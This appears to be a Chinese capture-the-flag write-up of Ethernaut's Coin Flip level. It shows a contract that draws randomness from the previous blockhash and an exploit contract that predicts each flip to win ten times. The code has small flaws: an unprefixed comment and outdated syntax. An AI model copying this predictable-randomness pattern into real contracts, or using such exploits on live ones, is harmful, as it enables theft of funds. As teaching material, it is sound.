### Coin Flip
### 题目
这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。
### 提示
查看上面的帮助页面，"Beyond the console" 部
### 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    //连胜次数-最后一个哈希值-随机数
    uint256 public consecutiveWins;
    //上一个区块的哈希值
    uint256 lastHash;
    //常量，用于将区块哈希值转换为一个较小的数值
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //构造函数-合约执行时连胜值初始化为0
    constructor() {
        consecutiveWins = 0;
    }

    //flip函数，返回一个bool值-猜测结果
    function flip(bool _guess) public returns (bool) {
        //对当前区块数-1的值取哈希然后转为uint256
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        //如果上一个区块的哈希值等于blockValue，就进行回滚交易，不会记录在区块中
        //防止重放攻击
        if (lastHash == blockValue) {
            revert();
        }
    
        //更新lasthash
        lastHash = blockValue;
        //硬币翻转结果
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        如果猜对了，连胜次数加1，返回true，否则连胜次数归0，返回false
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
### 解题思路
硬币翻转结果和当前区块相关，只要获取当前区块数，就可以知道当前的硬币结果  
手动执行有些困难，因此需要写一个合约来自动执行  
### 解题过程
```solidity
contract exploit {
    CoinFlip expFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function exploit(address aimAddr) {
        expFlip = CoinFlip(aimAddr);
        }
    function hack() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool guess = coinFlip == 1 ? true : false;
        expFlip.flip(guess);
        }
    }
```
1.获取实例后，获取合约的地址以及consecutiveWins  
2.在remix编译合约  
3.remix中部署“exploit”合约，使用上面获取到的合约地址  
4.调用十次hack（）攻击函数  
5.检查consecutiveWins是否大于10  
6.大于10则提交  
